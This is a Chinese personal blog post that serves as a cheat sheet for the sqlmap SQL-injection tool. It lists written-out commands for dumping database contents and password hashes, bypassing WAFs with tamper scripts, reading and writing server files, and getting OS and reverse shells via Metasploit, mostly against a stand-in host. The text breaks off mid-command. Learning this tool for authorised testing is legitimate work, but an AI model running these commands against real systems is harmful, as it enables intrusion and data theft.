<!DOCTYPE html>
<html lang="zh-Hans">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="future.zhangyan">



    <meta name="description" content="未来可期">



<title>sqlmap使用 | Hexo</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    




	<!--动态线条背景-->

<meta name="generator" content="Hexo 5.1.1"></head>

<body>
    <div class="wrapper">
        <header>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>

    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/book">Book</a>
                
                    <a class="menu-item" href="/bangumis">Bangumis</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
				<label for="switch_default" class="toggleBtn"></label>
         
				<div class="search bar7">
					<form id="search-form"> <!-- 搜索框相关 -->
						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
						<button type="submit" class="search-form-submit"></button>
						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
					</form>
					<div class="ins-section-wrapper">
						<div class="ins-section-container"></div>
					</div>
					<div id="local-search-result"></div> <!-- 搜索结果区 -->
						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
					</div>


        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/book">Book</a>
                
                    <a class="menu-item" href="/bangumis">Bangumis</a>
                
            </div>


        </div>
    </nav>

</header>
<style type="text/css">
	* {
		box-sizing:border-box;
	}
	body {
		margin:0;
		padding:0;
		background-image:url(ydrzimages/p3.jpg);
		font-weight:500;
		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
	}
	#container {
		width:500px;
		height:820px;
		margin:0 auto;
	}
	div.search {
		padding:10px 0;
		margin-left:200px
	}
	form {
		position:relative;
		width:300px;
		margin:0 auto;
	}
	input,button {
		border:none;
		outline:none;
	}
	input {
		width:100%;
		height:42px;
		padding-left:13px;
	}
	button {
		height:42px;
		width:42px;
		cursor:pointer;
		position:absolute;
	}
	/*搜索框7*/
		  
	.bar7 form {
		height:42px;
	}
	.bar7 input {
		width:200px;
		border-radius:42px;
		border:2px solid #324B4E;
		transition:.3s linear;
		float:right;
	}
	.bar7 input:focus {
		width:300px;
	}
	.bar7 button {
		background:none;
		top:-2px;
		right:20px;
	}
	.bar7 button:before {
		content:"点..";
		font-family:FontAwesome;
		color:#324b4e;
	}
	.no-result{
		display:none
	}
</style>

<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">sqlmap使用</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 9, 2020&nbsp;&nbsp;22:41:50</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
                            
                        </span>
						<span id="/2020/03/09/sqlmap%E4%BD%BF%E7%94%A8/" class="leancloud-visitors view" data-flag-title="sqlmap使用">
						  <em class="post-meta-item-text">Pageviews:</em>
						  <i class="leancloud-visitors-count"></i>
						</span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">cookie注入：sqlmap.py -u 注入点 --cookie &quot;参数&quot; --tables --level 2</span><br><span class="line"></span><br><span class="line">POST登录框注入：sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 登录的地址 --forms 自动判断注入</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 登录的地址 --data &quot;指定参数&quot;</span><br><span class="line"></span><br><span class="line">绕过waf防火墙：sqlmap.py -u 注入点 -v 3 --dbs --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-u       #注入点</span><br><span class="line"></span><br><span class="line">-g        谷歌搜索</span><br><span class="line"></span><br><span class="line">-f       #指纹判别数据库类型</span><br><span class="line"></span><br><span class="line">-b        #获取数据库版本信息</span><br><span class="line"></span><br><span class="line">-p        #指定可测试的参数(?page&#x3D;1&amp;id&#x3D;2 -p “page,id”)</span><br><span class="line"></span><br><span class="line">-D“”             #指定数据库名</span><br><span class="line"></span><br><span class="line">-T“”          #指定表名</span><br><span class="line"></span><br><span class="line">-C “”          #指定字段</span><br><span class="line"></span><br><span class="line">-s “”           #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)</span><br><span class="line"></span><br><span class="line">–columns              #列出字段</span><br><span class="line"></span><br><span class="line">–current-user          #获取当前用户名称</span><br><span class="line"></span><br><span class="line">–current-db            #获取当前数据库名称</span><br><span class="line"></span><br><span class="line">–users                        #列数据库所有用户</span><br><span class="line"></span><br><span class="line">–passwords                         #数据库用户所有密码</span><br><span class="line"></span><br><span class="line">–privileges                   #查看用户权限(–privileges -U root)</span><br><span class="line"></span><br><span class="line">-U                          #指定数据库用户</span><br><span class="line"></span><br><span class="line">–dbs                             #列出所有数据库</span><br><span class="line"></span><br><span class="line">–tables -D “”                    #列出指定数据库中的表</span><br><span class="line"></span><br><span class="line">–columns -T “user” -D “mysql”                             #列出mysql数据库中的user表的所有字段</span><br><span class="line"></span><br><span class="line">–dump-all                                          #列出所有数据库所有表</span><br><span class="line"></span><br><span class="line">–exclude-sysdbs                                            #只列出用户自己新建的数据库和表</span><br><span class="line"></span><br><span class="line">–dump -T “” -D “” -C “”                 #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</span><br><span class="line"></span><br><span class="line">–dump -T “” -D “” –start 2 –top 4                  # 列出指定数据库的表的2-4字段的数据</span><br><span class="line"></span><br><span class="line">–dbms                       #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)</span><br><span class="line"></span><br><span class="line">–os                 #指定系统(Linux,Windows)</span><br><span class="line"></span><br><span class="line">--sql -shell                  写shell</span><br><span class="line"></span><br><span class="line">--delay                      延迟的时间</span><br><span class="line"></span><br><span class="line">--safe-freq                         次数</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-v #详细的等级(0-6)</span><br><span class="line"></span><br><span class="line">0：只显示Python的回溯，错误和关键消息。</span><br><span class="line"></span><br><span class="line">1：显示信息和警告消息。</span><br><span class="line"></span><br><span class="line">2：显示调试消息。</span><br><span class="line"></span><br><span class="line">3：有效载荷注入。</span><br><span class="line"></span><br><span class="line">4：显示HTTP请求。</span><br><span class="line"></span><br><span class="line">5：显示HTTP响应头。</span><br><span class="line"></span><br><span class="line">6：显示HTTP响应页面的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">–privileges      #查看权限</span><br><span class="line"></span><br><span class="line">–is-dba           #是否是数据库管理员</span><br><span class="line"></span><br><span class="line">–roles               #枚举数据库用户角色</span><br><span class="line"></span><br><span class="line">–udf-inject            #导入用户自定义函数（获取系统权限）</span><br><span class="line"></span><br><span class="line">–union-check                  #是否支持union 注入</span><br><span class="line"></span><br><span class="line">–union-cols                       #union 查询表记录</span><br><span class="line"></span><br><span class="line">–union-test                         #union 语句测试</span><br><span class="line"></span><br><span class="line">–union-use                      #采用union 注入</span><br><span class="line"></span><br><span class="line">–union-tech orderby                    #union配合order by</span><br><span class="line"></span><br><span class="line">–method “POST” –data “”                    #POST方式提交数据(–method “POST” –data “page&#x3D;1&amp;id&#x3D;2″)</span><br><span class="line"></span><br><span class="line">–cookie “用;号分开”               #cookie注入(–cookies&#x3D;”PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;low”)</span><br><span class="line"></span><br><span class="line">–referer “”                #使用referer欺骗(–referer “http:&#x2F;&#x2F;www.baidu.com”)</span><br><span class="line"></span><br><span class="line">–user-agent “”                   #自定义user-agent</span><br><span class="line"></span><br><span class="line">–proxy “http:&#x2F;&#x2F;127.0.0.1:8118″                     #代理注入</span><br><span class="line"></span><br><span class="line">–string “”                        #指定关键词</span><br><span class="line"></span><br><span class="line">–threads 　　 #采用多线程(–threads 3)</span><br><span class="line"></span><br><span class="line">–sql-shell                 #执行指定sql命令</span><br><span class="line"></span><br><span class="line">–sql-query                     #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user &#x3D; ‘root’ LIMIT 0, 1″ )</span><br><span class="line"></span><br><span class="line">–file-read                    #读取指定文件</span><br><span class="line"></span><br><span class="line">–file-write                       #写入本地文件(–file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt;将本地的test.txt文件写入到目标的1.txt)</span><br><span class="line"></span><br><span class="line">–file-dest                          #要写入的文件绝对路径</span><br><span class="line"></span><br><span class="line">–os-cmd&#x3D;id                       #执行系统命令</span><br><span class="line"></span><br><span class="line">–os-shell               #系统交互shell</span><br><span class="line"></span><br><span class="line">–os-pwn                         #反弹shell(–os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;)</span><br><span class="line"></span><br><span class="line">–msf-path&#x3D;                         #matesploit绝对路径(–msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;)</span><br><span class="line"></span><br><span class="line">–os-smbrelay #</span><br><span class="line"></span><br><span class="line">–os-bof #</span><br><span class="line"></span><br><span class="line">–reg-read                         #读取win系统注册表</span><br><span class="line"></span><br><span class="line">–priv-esc #</span><br><span class="line"></span><br><span class="line">–time-sec&#x3D;                             #延迟设置 默认–time-sec&#x3D;5 为5秒</span><br><span class="line"></span><br><span class="line">-p “user-agent” –user-agent “sqlmap&#x2F;0.7rc1 (http:&#x2F;&#x2F;sqlmap.sourceforge.net)”            </span><br><span class="line">  #指定user-agent注入</span><br><span class="line"></span><br><span class="line">–eta #盲注</span><br><span class="line"></span><br><span class="line">&#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;txt&#x2F;</span><br><span class="line"></span><br><span class="line">common-columns.txt　　字段字典</span><br><span class="line"></span><br><span class="line">common-outputs.txt</span><br><span class="line"></span><br><span class="line">common-tables.txt 表字典</span><br><span class="line"></span><br><span class="line">keywords.txt</span><br><span class="line"></span><br><span class="line">oracle-default-passwords.txt</span><br><span class="line"></span><br><span class="line">user-agents.txt</span><br><span class="line"></span><br><span class="line">wordlist.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">1)判断当前用户是否是dba</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --is-dba -v 1</span><br><span class="line"></span><br><span class="line">2)--users:列出数据库管理系统用户</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --users -v 0</span><br><span class="line"></span><br><span class="line">3)--passwords:数据库用户密码(hash)</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --passwords -v 0</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --passwords -U sa -v 0</span><br><span class="line"></span><br><span class="line">4)查看用户权限</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --privileges -v 0</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --privileges -U postgres -v 0</span><br><span class="line"></span><br><span class="line">5)--dbs可以利用的数据库</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dbs -v 0</span><br><span class="line"></span><br><span class="line">6)--tables列数据库表</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --tables -D &quot;information_scheam&quot;</span><br><span class="line"></span><br><span class="line">-D:指定数据名称</span><br><span class="line"></span><br><span class="line">7)--columns 列出表中的列名</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --columns -T &quot;user&quot; -D &quot;mysql&quot; -v 1</span><br><span class="line"></span><br><span class="line">-T:指定表名，-D:指定库名</span><br><span class="line"></span><br><span class="line">8)--dump列表中指定列的内容</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dump -T &quot;users&quot; -D &quot;testdb&quot;</span><br><span class="line"></span><br><span class="line">-C:可以指定字段</span><br><span class="line"></span><br><span class="line">指定列的范围为2到4</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dump -T &quot;users&quot; -D &quot;testdb&quot; --start 2 --stop 4 -v 0</span><br><span class="line"></span><br><span class="line">9)--dumap-all列出所有数据库，所有表内容</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dump-all -v 0</span><br><span class="line"></span><br><span class="line">只列出用户自己新建的数据库和表的内容</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dump-all --exclude-sysdbs -v 0</span><br><span class="line"></span><br><span class="line">10)--file读取文件内容[load_file()函数]</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --file &#x2F;etc&#x2F;password</span><br><span class="line"></span><br><span class="line">11)执行SQL</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --sql-shell</span><br><span class="line"></span><br><span class="line">12)-p 指定参数</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 1 -p &quot;id&quot;</span><br><span class="line"></span><br><span class="line">-p可以指定多参数-p &quot;cat,id&quot;</span><br><span class="line"></span><br><span class="line">13)POST提交</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --method POST --data &quot;id&#x3D;1&quot;</span><br><span class="line"></span><br><span class="line">14)COOKIE提交</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --cookie &quot;id&#x3D;1&quot; -v 1</span><br><span class="line"></span><br><span class="line">cookie值可以由TamperData抓取</span><br><span class="line"></span><br><span class="line">15)refer欺骗</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --refer &quot;url&quot; -v 3</span><br><span class="line"></span><br><span class="line">16)使用自定义user-agent或者user-agents.txt</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --user-agent &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1)&quot; -v 3</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 1 -a &quot;.&#x2F;txt&#x2F;user-agents.txt&quot;</span><br><span class="line"></span><br><span class="line">17)使用多线程猜解</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 1 --current-user --threads 3</span><br><span class="line"></span><br><span class="line">18)指定数据库，绕过SQLMAP的自动检测</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 2 --dbms &quot;PostgreSQL&quot;</span><br><span class="line"></span><br><span class="line">19)指定操作系统绕过SQLMAP自动检测</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 2 --os &quot;Windows&quot;</span><br><span class="line"></span><br><span class="line">20)--prefix and --postfix自定义payload</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 3 -p &quot;id&quot; --prefix &quot;&#39;&quot; --postfix &quot;and &#39;test&#39;&#x3D;&#39;test&quot;</span><br><span class="line"></span><br><span class="line">21)union注入测试</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --union-test -v -1</span><br><span class="line"></span><br><span class="line">22)配合order by</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --union-test --union-tech orderby -v 1</span><br><span class="line"></span><br><span class="line">23)python sqlmap.py -u &quot;url&quot; -v 1 --union-use --banner</span><br><span class="line"></span><br><span class="line">24)python sqlmap.py -u &quot;url&quot; -v 5 --union-use --current-user</span><br><span class="line"></span><br><span class="line">25)python sqlmap.py -u &quot;url&quot; -v 1 --union-use --dbs</span><br></pre></td></tr></table></figure>

<p>常用语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -f -b –current-user –current-db –users –passwords –dbs -v 0</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –passwords -U root –union-use -v 2</span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2</span><br><span class="line"></span><br><span class="line">4.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –dump -C “user,pass” -v 1 –exclude-sysdbs</span><br><span class="line"></span><br><span class="line">5.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –sql-shell -v 2</span><br><span class="line"></span><br><span class="line">6.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –file-read “c:\boot.ini” -v 2</span><br><span class="line"></span><br><span class="line">7.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt -v 2</span><br><span class="line"></span><br><span class="line">8.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-cmd “id” -v 1</span><br><span class="line"></span><br><span class="line">9.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-shell –union-use -v 2</span><br><span class="line"></span><br><span class="line">10.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 –priv-esc -v 1</span><br><span class="line"></span><br><span class="line">11.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 1</span><br><span class="line"></span><br><span class="line">12.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-bof –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 1</span><br><span class="line"></span><br><span class="line">13.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –reg-add –reg-key&#x3D;”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value&#x3D;Test –reg-type&#x3D;REG_SZ –reg-data&#x3D;1</span><br><span class="line"></span><br><span class="line">14.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –eta</span><br><span class="line"></span><br><span class="line">15.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;get_str_brackets.php?id&#x3D;1″ -p id –prefix “‘)” –suffix “AND 